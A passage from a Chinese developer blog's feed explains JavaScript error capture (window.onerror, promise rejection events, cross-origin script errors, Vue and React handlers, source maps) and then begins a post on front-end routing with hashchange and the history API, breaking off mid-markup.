class="line">&#125;;</span><br></pre></td></tr></table></figure><p>(上文中返回true时，便不会把错误暴露在控制台中)</p><h3 id="二、会出现的问题或注意事项或解决办法"><a href="#二、会出现的问题或注意事项或解决办法" class="headerlink" title="二、会出现的问题或注意事项或解决办法"></a>二、会出现的问题或注意事项或解决办法</h3><h5 id="关于window-onerror-的使用"><a href="#关于window-onerror-的使用" class="headerlink" title="关于window.onerror 的使用"></a>关于window.onerror 的使用</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// test.js</span><br><span class="line">throw new Error(&quot;SHOW ME&quot;);</span><br><span class="line">window.onerror = function()&#123;</span><br><span class="line">console.log(arguments);</span><br><span class="line">// 阻止在控制台中打印错误信息</span><br><span class="line">return true;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面的代码直接报错了，没有继续往下执行。页面中可能有好几个 script 标签，但是 window.onerror 这个错误监听一定要放到最前头！</p><h5 id="关于-try-catch-的使用"><a href="#关于-try-catch-的使用" class="headerlink" title="关于 try..catch 的使用"></a>关于 try..catch 的使用</h5><p>对于 try..catch 的使用，一般建议是：能不用，尽量不要用。JS代码都是自己写出来的，哪里会出现问题，会出现什么问题，心中应该都有个谱，平时用到 try..catch 的一般只有两个地方：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// JSON 格式不对</span><br><span class="line">try&#123;</span><br><span class="line">  JSON.parse(JSONString);</span><br><span class="line">&#125;catch(e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">// 存在不可 decode 的字符</span><br><span class="line">try&#123;</span><br><span class="line">  decodeURIComponent(&quot;%111&quot;)</span><br><span class="line">&#125;catch(e)&#123;&#125;</span><br></pre></td></tr></table></figure><p>不能捕获异步的错误，promise、setTimeout等异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    console.log(1);</span><br><span class="line">    setTimeout(function () &#123;</span><br><span class="line">        console.log(2);</span><br><span class="line">        JSON.parse(&apos;&#123;&#123;&#125;&apos;);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">    console.log(3);</span><br><span class="line">&#125; catch (err) &#123;</span><br><span class="line">    console.log(&apos;55&apos;); //是捕获不到的</span><br><span class="line">&#125;</span><br><span class="line">console.log(4);</span><br></pre></td></tr></table></figure><h4 id="如何监听promise错误"><a href="#如何监听promise错误" class="headerlink" title="如何监听promise错误"></a>如何监听promise错误</h4><p>（关于事件 unhandledrejection、rejectionhandled）</p><blockquote><p>h5新增的事件；</p></blockquote><h5 id="unhandledrejection"><a href="#unhandledrejection" class="headerlink" title="unhandledrejection"></a>unhandledrejection</h5><p>当Promise 被reject并且没有得到处理的时候，会触发unhandledrejection事件。<br>unhandledrejection继承自PromiseRejectionEvent，PromiseRejectionEvent又继承自Event。因此unhandledrejection含有PromiseRejectionEvent和Event的属性和方法。</p><h5 id="rejectionhandled"><a href="#rejectionhandled" class="headerlink" title="rejectionhandled"></a>rejectionhandled</h5><p>当一个Promise错误最初未被处理，但是稍后又得到了处理，则会触发rejectionhandled事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&apos;error&apos;, error =&gt; &#123;</span><br><span class="line">    debugger;</span><br><span class="line">    console.log(&apos;error 监听&apos;,error); // 不会触发,这里不会</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">window.addEventListener(&apos;unhandledrejection&apos;, event =&gt; &#123;</span><br><span class="line">    debugger;</span><br><span class="line">    console.log(event.reason); // 打印&quot;啦啦啦啦 reject&quot;</span><br><span class="line">&#125;);</span><br><span class="line">window.addEventListener(&apos;rejectionhandled&apos;, event =&gt; &#123;</span><br><span class="line">    debugger;</span><br><span class="line">    console.log(&apos;rejection handled&apos;);</span><br><span class="line">&#125;);</span><br><span class="line">function foo() &#123;</span><br><span class="line">    return Promise.reject(&apos;啦啦啦啦 reject&apos;);</span><br><span class="line">&#125;</span><br><span class="line">var r = foo();</span><br><span class="line"></span><br><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">    r.catch(e =&gt; &#123; &#125;);</span><br><span class="line">&#125;, 1000);</span><br></pre></td></tr></table></figure><h5 id="无具体报错信息，只有Script-error"><a href="#无具体报错信息，只有Script-error" class="headerlink" title="无具体报错信息，只有Script error"></a>无具体报错信息，只有Script error</h5><blockquote><p>需要设置 crossorigin 并且服务器要设置 Access-Control-Allow-Origin 的响应头(被引用的资源链)：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://localhost/test.js&quot; crossorigin&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这种简单报错： Script error，目的是避免数据泄露到不安全的域中</p></blockquote><blockquote><p>crossOrigin参数 跳过跨域限制<br>image 和 script 标签都有此参数，它的作用就是告诉浏览器，我要加载一个外域的资源，并且我信任这个资源。</p></blockquote><h5 id="try-catch-拦截非同域的脚本错误（跨域脚本错误）"><a href="#try-catch-拦截非同域的脚本错误（跨域脚本错误）" class="headerlink" title="try catch 拦截非同域的脚本错误（跨域脚本错误）"></a>try catch 拦截非同域的脚本错误（跨域脚本错误）</h5><ul><li>首先：浏览器不会对try-catch起来的异常进行拦截</li></ul><p>所以，劫持原生方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const nativeAddEventListener = EventTarget.prototype.addEventListener;</span><br><span class="line">EventTarget.prototype.addEventListener = function (type, func, options) &#123; // 重写原生方法</span><br><span class="line">    const wrappedFunc = function (...args) &#123; // 将回调函数包裹一层try catch</span><br><span class="line">        try &#123; </span><br><span class="line">            return func.apply(this, args);</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            const errorObj = &#123;</span><br><span class="line">                ...</span><br><span class="line">                error_name: e.name || &apos;&apos;,</span><br><span class="line">                error_msg: e.message || &apos;&apos;,</span><br><span class="line">                error_stack: e.stack || (e.error &amp;amp;&amp;amp; e.error.stack),</span><br><span class="line">                error_native: e,</span><br><span class="line">                ...</span><br><span class="line">            &#125;;</span><br><span class="line">            // 接下来可以将errorObj统一进行处理。</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return nativeAddEventListener.call(this, type, wrappedFunc, options); // 调用原生的方法，保证addEventListener正确执行</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="async-await-和捕获异常"><a href="#async-await-和捕获异常" class="headerlink" title="async/await 和捕获异常"></a>async/await 和捕获异常</h5><p>作为异步的中级方案，catch异常也是很简单的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var sleep = function (time) &#123;</span><br><span class="line">    return new Promise(function (resolve, reject) &#123;</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">            reject(&apos;error&apos;);</span><br><span class="line">        &#125;, time);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var func = async function () &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        console.log(&apos;start&apos;);</span><br><span class="line">        await sleep(1000); // 这里得到了一个返回错误</span><br><span class="line">        </span><br><span class="line">        // 所以以下代码不会被执行了</span><br><span class="line">        console.log(&apos;end&apos;);</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">        console.log(&apos;catch内容：&apos;, err); // 这里捕捉到错误 `error`</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">func();</span><br></pre></td></tr></table></figure><p>#####有iframe的页面怎么监听？</p><ul><li>同源</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">window.frames[0].onerror = function (msg, url, row, col, error) &#123;</span><br><span class="line">    console.log(&#123;</span><br><span class="line">      msg,  url,  row, col, error</span><br><span class="line">    &#125;)</span><br><span class="line">    return true;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>非同源（包括可控与不可控）<br>可控的类似可以实行跨域那一套。postMessage等等。</li></ul><p>略</p><h4 id="关于网络请求的"><a href="#关于网络请求的" class="headerlink" title="关于网络请求的"></a>关于网络请求的</h4><p>由于网络请求异常不会冒泡，因此必须在capture阶段捕获才可以。但还有一个问题是这种方式无法精确判断异常的HTTP状态是404还是500等，因此还是要配合服务端日志来排查分析才可以。</p><p>所以，这种情况下onerror 是无法帮助我们捕获到异常的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  window.onerror = function (msg, url, row, col, error) &#123;</span><br><span class="line">    console.log(&apos;我知道异步错误了&apos;);</span><br><span class="line">    console.log(&#123;</span><br><span class="line">      msg,  url,  row, col, error</span><br><span class="line">    &#125;)</span><br><span class="line">    return true;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">//html</span><br><span class="line">&lt;img src=&quot;./404.png&quot;&gt;</span><br></pre></td></tr></table></figure><p>必须要：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&quot;error&quot;, function(e)&#123;</span><br><span class="line">    debugger;</span><br><span class="line">    console.log(&apos;报错了啦啦&apos;, e.bubbles)</span><br><span class="line">&#125;,   true);</span><br><span class="line"></span><br><span class="line">//html</span><br><span class="line">&lt;img src=&quot;404.jpg&quot;/&gt;</span><br></pre></td></tr></table></figure><h4 id="框架里面的问题"><a href="#框架里面的问题" class="headerlink" title="框架里面的问题"></a>框架里面的问题</h4><p>现在越来越多的项目开始使用前端框架，在MVVM框架中如果你一如既往的想使用window.onerror来捕获异常，很可能不好使，或许根本捕获不到，因为你的异常信息被框架自身的异常机制捕获了。<br>比如Vue 中我们应该这样捕获全局异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Vue.config.errorHandler = function (err, vm, info) &#123;</span><br><span class="line">    let &#123; </span><br><span class="line">        message, // 异常信息</span><br><span class="line">        name, // 异常名称</span><br><span class="line">        script,  // 异常脚本url</span><br><span class="line">        line,  // 异常行号</span><br><span class="line">        column,  // 异常列号</span><br><span class="line">        stack  // 异常堆栈信息</span><br><span class="line">    &#125; = err;</span><br><span class="line"></span><br><span class="line">    // vm为抛出异常的 Vue 实例</span><br><span class="line">    // info为 Vue 特定的错误信息，比如错误所在的生命周期钩子</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有，react 16里面提供了componentDidCatch方法，可以直接捕获react组件里面的异常来直接上报。这样其实对于react的场景就更简单了。它能捕获在子组件树中任何地方的 JavaScript 异常，并打印这些错误和展示备用UI, 就像将 children 包裹在一个大的 try/catch 语句块中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">let Com = function()&#123;</span><br><span class="line">    return (&lt;div&gt;        </span><br><span class="line">        &lt;ErrorHandler&gt;</span><br><span class="line">            &lt;TestState/&gt;</span><br><span class="line">        &lt;/ErrorHandler&gt;</span><br><span class="line">    &lt;/div&gt;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(&lt;Com/&gt;, document.getElementById(&apos;root&apos;));</span><br><span class="line"></span><br><span class="line">class ErrorHandler extends React.Component &#123;</span><br><span class="line">    constructor(props) &#123;</span><br><span class="line">        super(props);</span><br><span class="line">        this.state = &#123; hasError: false &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidCatch(error, info) &#123;</span><br><span class="line">        console.log(&apos;err.&apos;, error);</span><br><span class="line">        this.setState(&#123; hasError: true &#125;);</span><br><span class="line">        // report(error, info);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        if (this.state.hasError) &#123;</span><br><span class="line">            return &lt;h1&gt;这是报错页面&lt;/h1&gt;;</span><br><span class="line">        &#125;</span><br><span class="line">        return this.props.children;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//在子组件中</span><br><span class="line">//throw Error(&apos;我错啦&apos;);</span><br></pre></td></tr></table></figure><h2 id="定位错误"><a href="#定位错误" class="headerlink" title="定位错误"></a>定位错误</h2><p>我们的业务代码经webpack、gulp等打包压缩后产生如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!function(n)&#123;function t(e)&#123;if(r[e])return r[e].exports;var o=r[e]=&#123;i:e,l:!1,exports:&#123;&#125;&#125;;</span><br></pre></td></tr></table></figure><p>在控制台会看到对应的数据：<br>代码如期报错，并上报相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123; msg: &apos;Uncaught ReferenceError: xxx is not defined&apos;,</span><br><span class="line">  url: &apos;http://xxx/xxx.min.js&apos;,</span><br><span class="line">  row: &apos;10&apos;,</span><br><span class="line">  col: &apos;1000&apos; &#125;</span><br></pre></td></tr></table></figure><p>结合压缩后的代码，肉眼观察很难定位出具体问题</p><p>那我们如何定位到错误呢？</p><p>方法一：不压缩 js 代码</p><p>方法二：将压缩代码中分号变成换行</p><p>方案三：js 代码半压缩(保留空格和换行)</p><p>uglifyjs 的另一配置参数 beautify 设置为 true 时，最终代码将呈现压缩后进行格式化的效果（保留空格和换行），如</p><p>方案四：SourceMap 快速定位</p><blockquote><p>我们目前的办法是用chrome的DevTools这样的辅助工具。而且并不是每个线上资源都会添加 sourceMap 文件</p></blockquote><h5 id="sourceMap"><a href="#sourceMap" class="headerlink" title="sourceMap"></a>sourceMap</h5><p>SourceMap 是一个信息文件，存储着源文件的信息及源文件与处理后文件的映射关系。 里面储存着位置信息。也就是说，转换后的代码的每一个位置，所对应的转换前的位置。</p><p>我们在定位压缩代码的报错时，可以通过错误信息的行列数与对应的 SourceMap 文件，处理后得到源文件的具体错误信息。</p><p>打开Source map文件，它大概是这个样子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">version : 3,</span><br><span class="line">　　file: &quot;out.js&quot;,</span><br><span class="line">　　sourceRoot : &quot;&quot;,</span><br><span class="line">　　sources: [&quot;a.js&quot;, &quot;b.js&quot;],</span><br><span class="line">　　names: [&quot;src&quot;, &quot;maps&quot;, &quot;are&quot;, &quot;fun&quot;],</span><br><span class="line">　　mappings: &quot;AAgBC,SAAQ,CAAEA&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>version：Source map的版本，目前为3。</li><li>file：转换后的文件名。</li><li>sourceRoot：转换前的文件所在的目录。如果与转换前的文件在同一目录，该项为空。</li><li>sources：转换前的文件。该项是一个数组，表示可能存在多个文件合并。</li><li>names：转换前的所有变量名和属性名。</li><li>mappings：记录位置信息的字符串。</li></ul><p>应用举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var fs = require(&apos;fs&apos;);</span><br><span class="line">var sourceMap = require(&apos;source-map&apos;);</span><br><span class="line"></span><br><span class="line">// map文件</span><br><span class="line">var rawSourceMapJsonData = fs.readFileSync(&apos;./index.min.js.map&apos;, &apos;utf-8&apos;)</span><br><span class="line">rawSourceMapJsonData = JSON.parse(rawSourceMapJsonData)</span><br><span class="line"></span><br><span class="line">var consumer = new sourceMap.SourceMapConsumer(rawSourceMapJsonData);</span><br><span class="line"></span><br><span class="line">// 得到真实错误位置</span><br><span class="line">console.log(consumer.originalPositionFor(&#123;line: 1, column: 100&#125;))</span><br></pre></td></tr></table></figure><p><a href="http://www.ruanyifeng.com/blog/2013/01/javascript_source_map.html" target="_blank" rel="noopener">阮一峰JavaScript Source Map 详解</a></p><p><a href="https://github.com/swingboy/errorMonitor" target="_blank" rel="noopener">示例代码</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###前言: JS异常处理简介&lt;/p&gt;
&lt;p&gt;每天调试会看到控制台各种各式的红色错误代码。&lt;/p&gt;
&lt;p&gt;JavaScript错误是怎么输出到控制台的  ——  JavaScript的错误处理原理。&lt;/p&gt;
&lt;p&gt;当抛出异常时，JavaScript解释器会立即停下当前正在执
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>关于前端路由的一些事</title>
    <link href="http://swingboy.github.io/2018/04/12/%E5%85%B3%E4%BA%8E%E5%89%8D%E7%AB%AF%E8%B7%AF%E7%94%B1%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B/"/>
    <id>http://swingboy.github.io/2018/04/12/关于前端路由的一些事/</id>
    <published>2018-04-12T12:18:56.000Z</published>
    <updated>2020-04-28T10:33:34.508Z</updated>
    
    <content type="html"><![CDATA[<p>##关于前端路由的一些事</p><h3 id="路由实现"><a href="#路由实现" class="headerlink" title="路由实现"></a>路由实现</h3><h4 id="一、hashchange"><a href="#一、hashchange" class="headerlink" title="一、hashchange"></a>一、hashchange</h4><p>回忆基础知识：<br></p><p>1、hash即URL中”#”字符后面的部分。(location.hash 看下)</p><p>　　①使用浏览器访问网页时，如果网页URL中带有hash，页面就会定位到id（或name）与hash值一样的元素的位置；</p><p>　　②hash还有另一个特点，它的改变不会导致页面重新加载；</p><p>　　③hash值浏览器是不会随请求发送到服务器端的；</p><p>　　④通过window.location.hash属性获取和设置hash值。</p><blockquote><p>window.location.hash值的变化会直接反应到浏览器地址栏（#后面的部分会发生变化），同时，浏览器地址栏hash值的变化也会触发window.location.hash值的变化，从而触发onhashchange事件。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">//实现实例</span><br><span class="line">&lt;div class=&quot;main&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">            &lt;a href=&quot;/&quot;&gt;首页&lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;/profile&quot;&gt;个人中心&lt;/a&gt;</span><br><span class="line">            &lt;a href=&quot;/articles&quot;&gt;文章列表&lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;content&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        const $ = (selector) =&gt; document.querySelector(selector);</span><br><span class="line">        const routeMap = &#123;</span><br><span class="line">            &apos;/&apos;: () =&gt; &#123;</span><br><span class="line">                const content = $(&apos;.content&apos;);</span><br><span class="line">                content.innerHTML = &apos;&lt;div&gt;the Home Page&lt;/div&gt;&apos;;</span><br><span class="line">            &#125;,</span><br><span class="line">            &apos;/profile&apos;: () =&gt; &#123;</span><br><span class="line">                const content = $(&apos;.content&apos;);</span><br><span class="line">                content.innerHTML = &apos;&lt;div&gt;the Profile Page&lt;/div&gt;&apos;;</span><br><span class="line">            &#125;,</span><br><span class="line">            &apos;/articles&apos;: () =&gt; &#123;</span><br><span class="line">                const content = $(&apos;.content&apos;);</span><br><span class="line">                content.innerHTML = `&lt;div&gt;</span><br><span class="line">                    &lt;p&gt;the Article Page&lt;/p&gt;</span><br><span class="line">                    &lt;ul&gt;</span><br><span class="line">                        &lt;li&gt;文章1&lt;/li&gt;</span><br><span class="line">                        &lt;li&gt;文章2&lt;/li&gt;</span><br><span class="line">                        &lt;li&gt;文章3&lt;/li&gt;</span><br><span class="line">                    &lt;/ul&gt;</span><br><span class="line">                &lt;/div&gt;`;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        class Route &#123;</span><br><span class="line">            constructor(routeMap) &#123;</span><br><span class="line">                this.routeMap = routeMap;</span><br><span class="line">                this._bindPopState();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            init(path) &#123;</span><br><span class="line">                path = Route.correctPath(path);</span><br><span class="line">                history.replaceState(&#123; path: path &#125;, &apos;&apos;, path);</span><br><span class="line">                this.routeMap[path] &amp;&amp; this.routeMap[path]();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            go(path) &#123;</span><br><span class="line">                path = Route.correctPath(path);</span><br><span class="line">                history.pushState(&#123; path: path &#125;, &apos;&apos;, path);</span><br><span class="line">                this.routeMap[path] &amp;&amp; this.routeMap[path]();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            _bindPopState() &#123;</span><br><span class="line">                window.addEventListener(&apos;popstate&apos;, (e) =&gt; &#123;</span><br><span class="line">                    const path = e.state &amp;&amp; e.state.path;</span><br><span class="line">                    this.routeMap[path] &amp;&amp; this.routeMap[path]();</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            static correctPath(path) &#123;</span><br><span class="line">                if(path !== &apos;/&apos; &amp;&amp; path.slice(-1) === &apos;/&apos;)&#123;</span><br><span class="line">                    path = path.match(/(.+)\/$/)[1];</span><br><span class="line">                &#125;</span><br><span class="line">                return path;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const router = new Route(routeMap);</span><br><span class="line">        router.init(location.pathname);</span><br><span class="line">        </span><br><span class="line">        $(&apos;.menu&apos;).addEventListener(&apos;click&apos;, (e) =&gt; &#123;</span><br><span class="line">            if (e.target.tagName === &apos;A&apos;) &#123;</span><br><span class="line">                e.preventDefault();</span><br><span class="line">                router.go(e.target.getAttribute(&apos;href&apos;))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>2、hashchange事件（IE8已支持该事件）</p><p>　　①当URL的片段标识符更改时，将触发hashchange事件（跟在#符号后面的URL部分，包括#符号）</p><p>　　②hashchange事件触发时，事件对象会有hash改变前的URL（oldURL）和hash改变后的URL（newURL）两个属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&apos;hashchange&apos;, function(e) &#123;</span><br><span class="line">console.log(e.oldURL); </span><br><span class="line">console.log(e.newURL);</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure><h4 id="二、通过history"><a href="#二、通过history" class="headerlink" title="二、通过history"></a>二、通过history</h4><p>回忆:<br></p><p>history是HTML5新增的一个api。</p><blockquote><p>其中包括2个方法：<br><br>history.pushState() <br><br>history.replaceState() <br><br>1个事件：window.onpopstate。</p></blockquote><p>####说明:</p><h5 id="pushState"><a href="#pushState" class="headerlink" title="pushState"></a>pushState</h5><p>函数向浏览器的历史堆栈压入一个url为设定值的记录，并改变历史堆栈的当前指针至栈顶。</p><p>history.pushState(stateObject, title, url)，包括三个参数。</p><blockquote><p>stateObj，一个普通的js对象，可以包含任何数据，它包含在新的hsitory实体的state属性中。当用户导航到该状态时，一个popstate事件将会被触发，并且在该事件的e.state中会包含这个stateObj。</p></blockquote><blockquote><p>title，目前没什么用，我们可以传入一个空字符串，或者一个表示新history状态的字符串。</p></blockquote><blockquote><p>URL，可选参数，这将会改变浏览器当前的url，但是新的url并不会立刻加载。当时用户此时跳转到另外一个页面，然后再点击后退，该url会加载，并且触发popstate事件。</p></blockquote><p>示例： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history.pushState(&#123;name: &apos;xwj&apos;, age: 22&#125;, &apos;&apos;, &apos;/profile&apos;);</span><br><span class="line"></span><br><span class="line">// 浏览器地址会变为http://www.example.com/profile，但并不会加载。同时history的length会加1，state会变为传入的stateObj</span><br></pre></td></tr></table></figure><h5 id="replaceState"><a href="#replaceState" class="headerlink" 